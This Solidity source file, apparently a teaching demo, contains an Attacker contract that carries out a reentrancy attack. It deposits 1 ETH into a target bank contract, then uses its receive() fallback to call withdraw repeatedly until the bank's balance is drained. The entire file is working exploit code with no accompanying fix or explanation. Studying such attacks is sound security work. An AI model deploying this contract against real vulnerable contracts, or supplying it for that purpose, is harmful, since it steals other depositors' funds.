// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

// Demonstrates reentrancy attack
contract Attacker {
    IBank public bank;
    uint256 public attackAmount = 1 ether;
    
    constructor(address _bank) {
        bank = IBank(_bank);
    }
    
    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH");
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }
    
    // Reentrancy happens here
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}